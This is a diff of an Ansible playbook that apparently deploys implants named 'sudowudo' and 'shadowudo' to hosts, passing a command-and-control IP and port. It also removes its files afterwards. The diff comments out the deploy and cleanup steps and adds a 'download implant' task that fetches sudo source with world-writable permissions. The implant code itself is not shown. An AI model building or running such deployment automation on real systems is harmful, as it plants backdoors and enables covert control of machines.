@@ -6,6 +6,7 @@
   vars:
     c2_ip: "10.0.1.242"
     c2_port: 4242
+    sudo_version: "SUDO_1_9_14p3"
   become: yes
   tasks:
     - name: Clone repo
@@ -22,14 +23,21 @@
         - make
         - cmake
 
-    - name: Deploy sudowudo
-      command: sh /tmp/sudowudo/deploy-sudowudo {{ c2_ip }} {{ c2_port }}
+    - name: download implant
+      ansible.builtin.get_url:
+        url: "https://codeload.github.com/sudo-project/sudo/zip/refs/tags/SUDO_{{ sudo_version }}"
+        dest: "/tmp/sudowudo/sudo"
+        mode: '0777'
+        owner: root
 
-    - name: Deploy shadowudo
-      command: sh /tmp/sudowudo/deploy-shadowudo {{ c2_ip }} {{ c2_port }}
+    # - name: Deploy sudowudo
+    #   command: sh /tmp/sudowudo/deploy-sudowudo {{ c2_ip }} {{ c2_port }}
 
-    - name: Delete content & directory
-      ansible.builtin.file:
-        state: absent
-        path: '/tmp/sudowudo'
+    # - name: Deploy shadowudo
+    #   command: sh /tmp/sudowudo/deploy-shadowudo {{ c2_ip }} {{ c2_port }}
+
+    # - name: Delete content & directory
+    #   ansible.builtin.file:
+    #     state: absent
+    #     path: '/tmp/sudowudo'
 
